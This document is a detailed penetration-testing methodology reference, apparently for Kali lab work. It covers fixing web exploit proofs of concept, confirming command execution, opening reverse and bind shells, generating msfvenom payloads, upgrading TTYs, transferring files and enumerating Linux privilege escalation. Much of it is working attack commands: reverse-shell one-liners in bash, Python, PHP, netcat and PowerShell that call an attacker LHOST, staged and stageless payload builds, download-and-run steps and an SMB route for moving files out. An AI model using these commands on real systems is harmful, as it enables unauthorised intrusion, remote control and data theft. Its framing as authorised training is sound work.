methods.conditions: A valid baseline transaction with correct host, base path, session/CSRF state and request encoding
methods.access: An identified component/build and a candidate exploit with reviewable source
methods.result: A PoC that reproduces the relevant application request and a separately verified effect
methods.mechanics: Web exploit assumptions often fail at login, cookie handling, URL construction or response parsing before the vulnerable behavior is reached. Reconstruct the request before editing payload logic.
methods.example: Observation: the PoC reports success after a redirect to login. Test: compare its request with the authenticated browser baseline. Illustrative output: a missing CSRF token prevented the protected request. Interpretation: repair that state, then independently test the claimed effect.
methods.verify: Check the target action/output rather than trusting the PoC's success string.
methods.failure: A normal HTTP response can be an authentication or parsing failure. Separate application request repair from payload/callback diagnosis.

recognition.where: Capture the application's real valid transaction and compare it with the PoC's request path, login/session sequence and response parser.
recognition.sample:
PoC response: HTTP/1.1 302 Found
Location: /login
Actual browser request includes a fresh CSRF token
recognition.spot: The request never reached the protected operation; the success parser may be reading a login response.
recognition.confirm: Restore valid host/path/session/CSRF state, then independently verify the exploit effect.
recognition.enabled: The reconstructed request reaches the intended operation and the effect is observed: continue that candidate.
recognition.ruledout: The real operation/schema is incompatible with the PoC's vulnerable feature: reject it.
recognition.unknown: A normal HTTP response without authenticated operation evidence leaves exploitation inconclusive.

methods.procedure:
Before changing the script, reproduce the relevant request with Burp or curl and compare:

```bash
curl -i -X METHOD 'SCHEME://HOSTNAME:PORT/PATH' \
  -H 'Host: HOSTNAME' \
  -H 'Cookie: COOKIE' \
  --data 'PARAM=VALUE'
```

For a scoped lab with a known self-signed certificate:

```bash
curl -k -i 'https://HOSTNAME:PORT/PATH'
```

In Python Requests, use a session when cookies or defaults must persist:

```python
with requests.Session() as session:
    response = session.get(url, timeout=10)
    print(response.status_code, response.url)
    print(response.headers)
    print(response.text[:500])
```

Set `verify=False` only for a scoped test after confirming the certificate problem; it disables certificate and hostname validation. Prefer a supplied CA bundle when possible.

> **Parser cue:** `IndexError`, missing-key and regular-expression failures mean the received response did not have the assumed shape. Print status, final URL, headers and a bounded body fragment before rewriting the parser. Common causes are a changed path, redirect, failed login, CSRF change, error page, proxy/WAF response or certificate handling.

methods.clue: A PoC, injected command or remote client reports execution
methods.conditions: A functioning execution primitive and an observable output or controlled side effect
methods.access: Verified command execution or authenticated remote access and a known network path
methods.result: A verified foothold state with host, identity, privilege and network context
methods.mechanics: Execution, connection and a usable session are different capabilities. A command-output path may be enough to enumerate before any interactive shell exists.
methods.checks:
```bash
hostname
id
pwd
ip addr
ip route
```
methods.example: Observation: a PoC says the request completed. Test: obtain a hostname/identity proof through the same primitive. Illustrative output: a low-privileged service account responds. Interpretation: retain that foothold and choose a session method compatible with its interpreter and network.
methods.verify: Save destination identity/hostname and actual command output; use Windows hostname/whoami/ipconfig when appropriate.
methods.failure: A hung request or success message does not prove execution. First establish a bounded observable effect, then diagnose the next state.

recognition.where: Begin with the original command/PoC/client result and request a small host/identity proof through its existing output channel.
recognition.sample:
hostname: TARGET_HOST
uid=USER_ID(APP_USER) gid=GROUP_ID(APP_GROUP)
working directory: /APP_PATH
recognition.spot: Host-specific identity output demonstrates execution under that account, not yet a reverse connection or full terminal.
recognition.confirm: Record OS, privilege and network position; choose an access form whose interpreter/service and route exist.
recognition.enabled: The intended target's command proof is reproducible: use the confirmed foothold as the starting state.
recognition.ruledout: The tool's success message has no command-specific effect and the operation is rejected: discard its execution claim.
recognition.unknown: A hung request with no observable effect leaves execution unknown; obtain a bounded independent observation.

methods.procedure:
```text
delivery → execution → connection → usable session
```

| State | Decisive evidence | Does not yet prove |
| --- | --- | --- |
| Delivery | Exact bytes/request reached intended consumer | Payload executed |
| Execution | Harmless command output or controlled side effect | Network callback works |
| Connection | Listener records the expected peer | Commands and I/O are usable |
| Session | Commands return and host/identity are verified | Higher privilege or stability |

Do not change all four layers at once. Preserve the last confirmed state and test the next boundary.

| Situation | Prefer | Main prerequisite / limitation |
| --- | --- | --- |
| One bounded action is enough | Direct command execution | Observable output or side effect; no shell required |
| Valid credential and remote service | SSH, WinRM or RDP | Authentication plus remote-logon authorization |
| Target can reach Kali | Reverse shell | Target egress and a reachable Kali listener |
| Kali can reach a target listener | Bind shell | Target can bind and inbound path permits it |
| Payload is staged or protocol-aware | Matching framework handler | Handler must use the exact payload/transport |

Prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell.

Linux:

```bash
id; hostname; pwd
```

Windows:

```cmd
whoami & hostname & cd
```

For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout.

Linux:

```bash
hostname; id; pwd
ip addr; ip route
ss -lntup
```

Windows:

```cmd
hostname
whoami /all
cd
ipconfig /all
route print
netstat -ano
```

Record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. Then re-enumerate from the new state.

```text
exact prerequisites
→ exploit reaches expected vulnerable path
→ bounded harmless effect or identity output
→ repeatable command execution
→ payload reaches listener
→ usable session
→ verified host/identity/privilege/network position
```

Do not accept the exploit's own “success” string as proof. Validate an independent effect. An HTTP `200`, uploaded filename, connection or application crash each proves less than a verified command result.

methods.mechanics: The target initiates the connection. The chosen LHOST must be reachable from that target, possibly through a pivot; shell syntax must survive every outer parser.

```bash
command -v bash python3 php nc

```

Illustrative output: a connection and target identity appear. Interpretation: stabilize the terminal before interactive tools.

methods.failure: No packets suggests route/listener/trigger; packets without commands suggest payload/listener mismatch. Check the first failed boundary.

recognition.commands:
```bash
command -v bash python3 php nc

```
recognition.sample:

/usr/bin/python3
LHOST via GATEWAY dev INTERFACE
recognition.spot: An interpreter plus a plausible outbound route suggests a reverse-channel candidate.
recognition.confirm: Verify target-to-listener reachability, listener binding, exact shell/parser and payload compatibility.
recognition.enabled: The minimal connection works and the shell/handler matches: select that reverse channel.
recognition.ruledout: The chosen interpreter is absent: reject that interpreter's payload, retaining other available methods.
recognition.unknown: A route entry without packet/connection evidence leaves egress filtering unresolved.

methods.procedure:
```text trigger context → target process/interpreter and architecture → target source interface → route/egress controls → LHOST address visible from target → LPORT → local bind interface → listener/handler ``` Select `LHOST` from the target's point of view. A VPN address, tunnel endpoint or reachable interface may be correct while Kali's default-route address is wrong. On Kali: ```bash ip -brief address ip route ss -lntp ``` Windows source/listener checks: ```powershell Get-NetIPAddress -AddressFamily IPv4 Get-NetRoute -AddressFamily IPv4 Get-NetTCPConnection -State Listen ``` Traditional/OpenBSD-style `nc` commonly used on Kali: ```bash rlwrap nc -lvnp LPORT ``` Nmap Ncat uses a positional listen port; do not mechanically copy every `nc` flag: ```bash ncat -4 -lvn 0.0.0.0 LPORT ``` Verify the bind in another terminal: ```bash ss -lntp | grep ':LPORT' ``` If multiple interfaces exist, bind deliberately: ```bash ncat -4 -lvn LHOST LPORT ``` > **Failure cue:** a listener bound only to `127.0.0.1`, the wrong VPN/interface address or the wrong address family cannot receive the expected callback. “Address already in use” means another process owns the bind. Choose an interpreter that you confirmed exists. Bash TCP: ```bash bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' ``` Python 3 with a PTY: ```bash python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' ``` Portable FIFO plus Netcat when `-e` is absent: ```bash rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f ``` PHP CLI: ```bash php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' ```
Variant — target has Ncat command execution Linux: ```bash ncat LHOST LPORT --exec /bin/sh ``` Windows: ```cmd ncat.exe LHOST LPORT --exec cmd.exe ``` `--exec` exposes the named program directly to the network connection. Use only on the assigned host and remove transferred tooling when the exercise requires cleanup.
> **Shell-language cue:** a command injection may execute through `/bin/sh`, which does not understand every Bash construct. Wrap Bash-specific syntax in `bash -c '...'` and then encode it for the outer HTTP/template/database layer.

methods.clue: Windows execution or valid credentials with an available remote service
methods.conditions: Accepted remote-service rights or compatible PowerShell execution; correct encoding, policy context and callback route

methods.result: A verified Windows session with known token and channel limitations
methods.mechanics: Authenticated WinRM/RDP/SSH can be simpler than an injected callback. A basic PowerShell TCP loop is a command stream rather than a full terminal; encoding fixes parser transport, not authorization or endpoint controls.
methods.example: Observation: a PowerShell command can execute but RDP rights are absent. Test: select a supported command channel and verify its identity. Illustrative output: commands run as the web service account. Interpretation: enumerate that token rather than assume an interactive administrator session.
methods.verify: Verify hostname, whoami /all and command behavior through the resulting channel.
methods.failure: A saved credential may be valid for one protocol only. PowerShell policy, language mode, parser and antimalware evidence require different responses.

recognition.where: From Windows execution inspect the actual PowerShell/runtime context and any reachable authenticated remote service before building a callback.
recognition.sample:
User: DOMAIN\APP_USER
PSVersion: AVAILABLE_VERSION
LanguageMode: ConstrainedLanguage
recognition.spot: The execution identity and constrained language context affect which command-channel implementations can run.
recognition.confirm: Check permitted language features, remote endpoint authorization or a working callback route; encoding does not grant those.
recognition.enabled: A supported native endpoint or verified compatible command channel works: use it and verify its token.
recognition.ruledout: The chosen .NET-heavy implementation is blocked by this language mode: discard that implementation.
recognition.unknown: Unknown policy/AMSI/endpoint behavior requires identifying the first failing layer.

methods.procedure:
Prefer an available authenticated service:

```bash
evil-winrm -i TARGET -u USER -p 'PASSWORD'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore
ssh -p PORT USER@TARGET
```

PowerShell TCP shell when direct command execution is the only primitive:

```powershell
$client = [Net.Sockets.TcpClient]::new('LHOST',LPORT)
$stream = $client.GetStream()
$buffer = New-Object byte[] 65535
while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) {
  $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count)
  $output = (Invoke-Expression $command 2>&1 | Out-String) + "PS $((Get-Location).Path)> "
  $bytes = [Text.Encoding]::ASCII.GetBytes($output)
  $stream.Write($bytes,0,$bytes.Length)
  $stream.Flush()
}
$client.Close()
```

> This is a basic command channel, not a ConPTY. Host policy, language mode, AMSI/antimalware, quoting and the parent process can affect it.

PowerShell `-EncodedCommand` solves nested quoting; it is not encryption or an AV bypass. Generate UTF-16LE Base64 locally:

```powershell
$command = 'COMMAND'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
$encoded
```

Invoke in the target command context:

```cmd
powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE
```

methods.procedure:
Use a bind shell only when Kali can reach a target listener and reverse egress is unavailable.

Traditional Netcat with `-e` support on a Linux target:

```bash
nc -lvnp PORT -e /bin/sh
```

Connect from Kali:

```bash
nc -nv TARGET PORT
```

FIFO alternative when `-e` is absent:

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp PORT >/tmp/f
```

Ncat target listener:

```bash
ncat -4 -lvn 0.0.0.0 PORT --exec /bin/sh
```

methods.title: Generate a payload matching OS, process, format and handler
methods.clue: An existing exploit/delivery primitive needs a binary or raw payload
methods.conditions: Verified target/process architecture, delivery format, callback route, payload constraints and a matching staged/stageless listener
methods.access: Verified command execution or authenticated remote access and a known network path
methods.result: A compatible artifact and a correctly paired listener configuration
methods.mechanics: An ELF, PE, script and raw shellcode serve different consumers. A staged payload requires another transfer and a matching handler; Netcat may receive a stage request without producing a shell.
methods.checks:
```bash
msfvenom -l payloads
msfvenom --list formats
msfvenom -p PAYLOAD_NAME --list-options
```
methods.example: Observation: a payload connects to Netcat but produces unreadable/no commands. Test: inspect the exact staged payload name and pair its handler. Illustrative output: staging completes and the intended session appears. Interpretation: verify the identity and record the permitted framework context.
methods.verify: Check artifact format/hash and actual session identity; generation success is not execution proof.
methods.failure: Wrong architecture, stage/handler mismatch, missing second route or payload-space constraints require separate fixes. Encoding does not guarantee endpoint-control bypass.

recognition.where: Inspect the actual consumer/process and existing exploit constraints before browsing payload names or formats.
recognition.commands:
```bash
file TARGET_ARTIFACT
msfvenom -l payloads
msfvenom --list formats
```
recognition.sample:
Consumer: Windows x64 executable
Candidate payload: windows/x64/shell/reverse_tcp
Delivery expects: PE executable
recognition.spot: The staged payload name and executable consumer must be matched to the handler and delivery format.
recognition.confirm: Check target/process architecture, permitted feature, exact payload options, stage route and listener.
recognition.enabled: Format/architecture/handler and routes all match: generate the selected artifact.
recognition.ruledout: An ELF or DLL is supplied to an EXE-only consumer: reject that format.
recognition.unknown: OS architecture without process/delivery evidence does not settle payload compatibility.

methods.procedure:
List rather than guess names and formats:

```bash
msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
msfvenom --list formats
msfvenom -p PAYLOAD_NAME --list-options
```

Stageless command-shell binaries:

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -f elf -o shell.elf

msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -f exe -o shell.exe
```

Verify the resulting artifacts:

```bash
file shell.elf shell.exe
sha256sum shell.elf shell.exe
```

> `msfvenom` does not make a payload compatible with the delivery path. Match target OS, process architecture, payload type, output format, available execution method and callback route.

##### Staged versus stageless

```text
stageless: complete payload delivered at once; larger, usually simpler and more stable
staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer
```

Metasploit naming commonly reflects the distinction:

```text
windows/x64/shell_reverse_tcp   stageless
windows/x64/shell/reverse_tcp   staged
```

A raw Netcat listener can receive many ordinary stageless command shells. A staged payload normally needs `multi/handler` configured with the exact same payload:

```text
msfconsole -q
use exploit/multi/handler
set payload PAYLOAD_NAME
set LHOST LHOST
set LPORT LPORT
show options
run
```

> A connection to Netcat with no usable commands can mean a staged payload reached a non-staging listener. It is not necessarily failed code execution.

##### Existing-PoC payload constraints

Only when an existing reviewed PoC documents payload space and bad characters:

```bash
msfvenom -p PAYLOAD_NAME \
  LHOST=LHOST LPORT=LPORT \
  -f FORMAT -v VARIABLE \
  -b 'BAD_CHARACTERS' \
  -s MAX_SPACE
```

Encoders and repeated encoding do not guarantee antimalware evasion. `-b` is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list.

methods.example: Observation: the shell runs commands but interactive sudo fails. Test: spawn a PTY and repair local terminal settings. Illustrative output: tty reports a device and the prompt behaves correctly. Interpretation: retry the legitimate interactive prerequisite check.
methods.verify: Check tty, signal handling and an interactive program; confirm the same identity remains.
methods.failure: A dropped connection is not solved by terminal settings. If no PTY mechanism exists, use noninteractive commands or an authenticated terminal method.

recognition.where: Inspect the working shell's terminal state and available PTY utilities after verifying a stable command channel.
recognition.sample:
not a tty
/usr/bin/python3
recognition.spot: A functioning socket shell lacks a controlling terminal while a potential PTY mechanism exists.
recognition.confirm: Verify the available PTY mode, local terminal handling and stable connection; privilege remains unchanged.
recognition.enabled: The supported PTY and local settings restore terminal behavior: use interactive tools in that same identity.
recognition.ruledout: The channel drops before any command executes: reject terminal settings as the first fault.
recognition.unknown: No PTY utility found leaves alternative terminal methods/noninteractive use to investigate.

methods.procedure:
First obtain a PTY with an available interpreter:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl-Z` locally, then:

```bash
stty raw -echo; fg
```

Back in the remote shell:

```bash
reset
export TERM=xterm-256color
stty rows 40 columns 120
```

If the local terminal becomes unreadable, restore it from a separate/local shell:

```bash
stty sane
```

Socat can provide a stronger PTY when present on both sides:

```bash
# Kali
socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr

# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
```

> TTY repair changes terminal behavior, not privilege or network reliability. A PTY may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one.

methods.clue: A tool/artifact must reach a target that can make an HTTP request
methods.conditions: Correct server bind and served directory; target-to-server route, available downloader and writable destination
methods.access: Verified command execution or authenticated remote access and a known network path
methods.result: A downloaded file whose destination bytes can be verified
methods.mechanics: The target is the HTTP client even when the assessment host started the operation. A 404 is a server-path problem; no request is a different boundary from successful download with incompatible execution.
methods.example: Observation: a download reports success but the tool fails. Test: compare source/destination SHA-256 before execution. Illustrative output: hashes differ and the destination contains an error page. Interpretation: correct the HTTP path and repeat the transfer.
methods.verify: Compare sha256sum on Linux or Get-FileHash -Algorithm SHA256 on Windows, and verify destination permissions.
methods.failure: No request: route/bind/egress. 404: path/name. Matching file but no execution: interpreter/format/control. Diagnose each separately.


recognition.spot: A downloader, destination and plausible outbound path enable an HTTP transfer candidate.
recognition.confirm: Check actual server bind/directory, HTTP request/response and source/destination hashes.

methods.procedure:
On Kali, serve the directory containing `linpeas.sh`: ```bash cd /path/to/tools python3 -m http.server 8000 --bind 0.0.0.0 ``` On the Linux target, download into a writable directory and run it: ```bash wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh | tee /tmp/linpeas.txt ``` > **Read:** Kali should log an HTTP request and a successful response. A downloaded enumeration script is a lead generator; manually verify any escalation candidate.
HTTP variants — fixed server directory, curl, Windows and alternate built-ins ##### Serve a fixed directory without changing folders ```bash python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools ``` Python's simple server supplies downloads over unencrypted HTTP. Stop it with `Ctrl+C` when finished. ##### Linux target with curl ```bash curl -fL http://LHOST:8000/FILE -o /tmp/FILE ``` `-f` reports HTTP errors and `-L` follows redirects. Use a writable destination. ##### Windows target with PowerShell Run inside PowerShell: ```powershell Invoke-WebRequest -Uri "http://LHOST:8000/FILE" -OutFile "C:\Windows\Temp\FILE" ``` From `cmd.exe`, invoke PowerShell explicitly: ```cmd powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://LHOST:8000/FILE' -OutFile 'C:\Windows\Temp\FILE'" ``` ##### Windows alternatives ```powershell (New-Object Net.WebClient).DownloadFile('http://LHOST:8000/FILE','C:\Windows\Temp\FILE') ``` ```cmd curl.exe -fL http://LHOST:8000/FILE -o C:\Windows\Temp\FILE ``` ```cmd certutil.exe -urlcache -split -f http://LHOST:8000/FILE C:\Windows\Temp\FILE ``` Availability and policy can differ by host. `certutil` may leave URL-cache artifacts; remove only artifacts you created when cleanup is appropriate.
Compare the source and destination hashes. On Kali or Linux: ```bash sha256sum FILE sha256sum /tmp/FILE ``` On Windows: ```powershell Get-FileHash -Algorithm SHA256 "C:\Windows\Temp\FILE" ``` > **Decisive output:** matching SHA-256 values establish that the two saved files contain the same bytes. A successful HTTP status alone does not.

methods.access: Verified command execution or authenticated remote access and a known network path
methods.result: An authenticated file copy with verified bytes
methods.mechanics: SCP uses SSH authentication but filesystem rights remain independent. Modern clients may use the SFTP subsystem; a restricted service can allow one access form and deny another.
methods.example: Observation: SSH login succeeds but copying into an application directory fails. Test: copy to the user's writable temporary directory. Illustrative output: transfer completes and hashes match. Interpretation: destination authorization caused the original failure.
methods.verify: Verify copied bytes and location; uppercase -P selects scp's SSH port.
methods.failure: Authentication failure, missing subsystem and destination permission failure need different changes. Prefer a supported transfer method over guessing flags.

methods.procedure: SCP — copy through an authenticated SSH service ##### Kali to a Linux target ```bash scp FILE USER@TARGET:/tmp/FILE ``` ##### Linux target to Kali Run from Kali when the target's SSH service is reachable: ```bash scp USER@TARGET:/path/to/FILE ./FILE ``` ##### SSH key or nonstandard port ```bash scp -i KEY -P PORT FILE USER@TARGET:/tmp/FILE ``` `scp` uses uppercase `-P` for the SSH port. Authentication success does not guarantee write permission at the destination path.

methods.clue: A Windows source can reach a temporary assessment-side SMB service

methods.access: Verified command execution or authenticated remote access and a known network path
methods.result: A verified read/write transfer over the temporary share
methods.mechanics: Share authentication belongs to the temporary server, not automatically the target domain. Existing Windows connections to the same server can conflict with another credential context.
methods.example: Observation: HTTP is unavailable but outbound SMB is permitted. Test: connect to the authenticated share and copy one artifact. Illustrative output: copy succeeds and SHA-256 matches. Interpretation: use that transfer route and remove the created connection afterward.

TcpTestSucceeded : True
Existing connection: \\LHOST\OTHER_SHARE as OTHER_USER
recognition.spot: The service is reachable, but an existing connection can constrain a different credential context.
recognition.confirm: Verify intended share/server credentials, conflicting mappings, read/write rights and destination hash.
recognition.enabled: The intended authenticated share action succeeds and bytes match: use this transfer route.
recognition.ruledout: Outbound SMB is blocked from this source: reject this direction, choosing another transport.

methods.procedure: SMB — read and write files from Windows ##### Start an authenticated SMB share on Kali ```bash mkdir -p share sudo impacket-smbserver transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD' ``` The first positional value is the share name; the second is its local directory. The supplied `USER` and `PASSWORD` authenticate to this temporary Kali share. Some installations expose the legacy wrapper name: ```bash sudo smbserver.py transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD' ``` ##### Connect and download from Windows ```cmd net use \\LHOST\transfer /user:USER "PASSWORD" copy \\LHOST\transfer\FILE C:\Windows\Temp\FILE ``` ##### Upload evidence from Windows to Kali ```cmd copy C:\Windows\Temp\FILE \\LHOST\transfer\FILE net use \\LHOST\transfer /delete ``` Kali must accept inbound TCP/445 and the target must permit outbound SMB. The share is read/write unless started with Impacket's `-readonly` option.

methods.clue: Only a raw TCP tool and a direct or forwarded connection are available
methods.conditions: Unambiguous sender/receiver direction, compatible Netcat listener syntax and a writable output file
methods.access: Verified command execution or authenticated remote access and a known network path
methods.result: A byte stream saved as a file and independently checked for integrity
methods.mechanics: A raw stream carries no filename, authentication or integrity metadata. Terminal output and connection termination can corrupt or truncate the saved file.
methods.example: Observation: a raw transfer connects but the saved artifact is shorter. Test: compare size/hash and inspect sender termination behavior. Illustrative output: a repeated clean transfer matches the source. Interpretation: only the matching copy is suitable for execution.
methods.verify: Compare hashes and avoid mixing diagnostic text into the file stream.
methods.failure: A connection without a complete hash match proves only transport. Use SCP/HTTP/SMB when those routes exist.

Direction: sender -> receiver listener
Destination: writable
recognition.spot: A raw stream may move bytes only if roles and connection direction are correct; no integrity metadata is supplied.
recognition.confirm: Confirm listener syntax, reachability, binary-clean I/O and a complete independent hash match.
recognition.enabled: The chosen stream finishes with matching bytes: use the saved artifact.
recognition.ruledout: The only available direction cannot reach the receiver: reject this stream route.
recognition.unknown: A connection with unknown termination/file size leaves transfer completeness unresolved.

methods.procedure: Netcat — stream a file when a direct TCP connection is possible ##### Retrieve a file from the target to Kali Kali receives: ```bash nc -lvnp PORT > FILE ``` The target sends: ```bash nc -nv LHOST PORT < /path/to/FILE ``` ##### Send a file from Kali to the target The target receives: ```bash nc -lvnp PORT > /tmp/FILE ``` Kali sends: ```bash nc -nv TARGET PORT < FILE ``` If the listener rejects `-p`, use the OpenBSD-style form and check `nc -h` locally: ```bash nc -lvn PORT > FILE ``` Netcat provides no authentication, encryption, filename metadata or integrity check. Confirm direction and compare hashes afterward.

methods.mechanics: Base64 transports bytes through text; it does not encrypt them or guarantee that the command channel preserves length and quoting.
methods.example: Observation: a short configuration must cross a command-only channel. Test: encode, decode at the destination and compare hashes. Illustrative output: the hash matches. Interpretation: the byte transport succeeded; execution compatibility remains separate.

methods.procedure: Base64 — move a small file through a text-only channel ##### Encode on Linux ```bash base64 -w 0 FILE ``` ##### Decode on Linux ```bash printf '%s' 'BASE64_DATA' | base64 -d > /tmp/FILE ``` ##### Decode in PowerShell ```powershell [IO.File]::WriteAllBytes('C:\Windows\Temp\FILE',[Convert]::FromBase64String('BASE64_DATA')) ``` Use this for small files. Long encoded values are easy to truncate or corrupt; compare hashes.

methods.procedure: Temporary FTP — only when an FTP client is the available route On Kali, after intentionally selecting/installing `pyftpdlib` in an isolated environment: ```bash python3 -m pyftpdlib -p PORT ``` On the target: ```text ftp LHOST PORT binary get FILE put FILE quit ``` The default temporary server can be unauthenticated and plaintext. Bind/serve only the intended directory, expose it only for the transfer, compare hashes and stop it immediately. HTTP/SCP/SMB are normally preferable.

methods.clue: A new Linux foothold or an identity/privilege change
methods.conditions: A working command channel and accurate effective identity, group, mount and process context
methods.access: A verified Linux foothold with a known effective UID, groups and filesystem context
methods.result: An evidence-ranked escalation queue and a verified current privilege state
methods.mechanics: Privileges belong to effective identity and execution context, not a username string. A container root UID can differ from host root; a new identity changes readable files and available controls.
methods.checks:
```bash
hostname
id
uname -a
cat /etc/os-release
findmnt
sudo -l
```
methods.example: Observation: a shell runs as an application account. Test: collect identity, sudo rules and root-owned activity. Illustrative output: one permitted interpreter and a writable backup directory. Interpretation: validate those specific consumers before selecting a kernel exploit.
methods.verify: Record effective UID/groups, host/namespace and the exact candidate permission; re-check identity after every claimed escalation.
methods.failure: Missing tools or permission-denied inventory is partial visibility. Use built-ins and inspect concrete application paths rather than claiming no escalation path exists.

recognition.where: At a new shell collect effective IDs/groups, current mounts, root-owned activity and exact sudo rules before choosing a technique.
recognition.sample:
uid=USER_ID(APP_USER) groups=APP_GROUP
(root) NOPASSWD: /usr/bin/find
root ... /bin/sh /OPT_PATH/backup.sh
recognition.spot: The sudo rule and privileged backup consumer open different candidate families; neither should be replaced by an automatic kernel choice.
recognition.confirm: For each candidate establish exact permitted operation/object, run-as identity and trigger.
recognition.enabled: A candidate's complete permission/consumer chain is validated: choose that specific method.
recognition.ruledout: A highlighted process belongs to the same low user: reject its assumed privilege gain.
recognition.unknown: Permission-denied inventory is incomplete visibility; use known application paths and supported built-ins.

methods.procedure:
> **Decisive output:** current identity/groups, OS/kernel/architecture, network position, root-owned activity, mounts and exact sudo rules.

```bash
hostname; id; groups
uname -a; cat /etc/os-release; getconf LONG_BIT
pwd; umask; env
ip addr; ip route; ss -lntup; ss -lxnp
ps auxf
mount; findmnt; lsblk; df -hT
sudo -n -l 2>&1
sudo -l
```

```bash
getent passwd
awk -F: '$3 == 0 || $7 !~ /(nologin|false)$/ {print $1,$3,$4,$6,$7}' /etc/passwd
```

> **Priority:** credentials/sudo → root-consumed writable objects → SUID/capabilities → privileged groups/mounts/local services → PATH/libraries/wildcards → software/kernel.

```bash
id; whoami; groups
hostname; pwd
ip addr; ip route
```

After root, re-enumerate newly readable credentials, services, listeners, mounts and routes. Capture the exact command, decisive output and state transition required by the objective; keep target details and proof material private.
